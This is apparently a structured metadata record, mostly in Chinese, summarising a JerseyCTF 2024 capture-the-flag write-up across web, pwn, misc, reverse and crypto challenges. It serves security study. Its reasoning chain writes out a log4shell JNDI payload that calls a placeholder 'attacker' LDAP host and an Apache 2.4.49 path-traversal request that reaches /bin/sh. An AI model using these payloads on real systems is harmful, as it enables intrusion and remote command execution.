...
lesson: '|'
quality: medium
full_path: JerseyCTF_Writeup.full.md
meta_path: JerseyCTF_Writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: JerseyCTF Writeup (Web + Pwn + Misc + Forensics + Reverse + Crypto)。JerseyCTF 2024 多类目 writeup (Web log4j/Apache 2.4.49 / Pwn shellcode/ret2libc / Misc 频谱 / Reverse 字节 XOR / Crypto RSA)。。经验：|
category: web
...
contest_type: open
wp_url: https://www.ctfiot.com/169617.html
reasoning_chain:
- Web log4j：${jndi:ldap://attacker/} → 触发点：log4shell
- 动作：搭 marshalsec LDAP server → 假设：触发 RCE → 观察：java -cp marshalsec... -> Exploit 类加载 → shell
- Apache 2.4.49 RCE：路径穿越 CVE-2021-41773 → 触发点：mod_cgi → 动作：/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh → 观察：命令执行
- Pwn shellcode jmp rsp → 假设：栈空间执行 → 动作：ret + jmp rsp + shellcode → 完成
- Pwn ret2libc 标准链 → 同 ImaginaryCTF babybof
- Misc audio spectrogram：wav 文件 → 触发点：频谱藏 flag → 动作：Audacity / sox 转频谱 → 观察：flag 字符
- Reverse ROL/ROR 字节变换 → 假设：固定循环 → 动作：写解密脚本 → 完成
- Crypto RSA：p/q 接近 → 假设：Fermat 分解 → 动作：Fermat factorization → 观察：flag
failed_attempts:
- log4j 直接弹计算器 → 失败：必须 marshalsec 中转
- Apache 2.4.49 试 GET /etc/passwd → 失败：要 mod_cgi
- RSA 试 Pollard rho → 失败：p/q 太接近用 Fermat
key_observations:
- log4shell 必须搭 LDAP/RMI server + 字节码类
- Apache 2.4.49 路径穿越 + mod_cgi = RCE
- 音频频谱藏 flag 是 Misc 高频考点
- Fermat factorization 处理 p/q 接近 RSA 极快
- JerseyCTF 风格：log4j + Apache + audio + RSA 各一题
prerequisites:
- log4j JNDI 注入（marshalsec）+ Apache 2.4.49 路径穿越
- 音频频谱分析（Audacity / sox）+ RSA Fermat factorization
- pwntools ret2libc / shellcode
---
# JerseyCTF Writeup
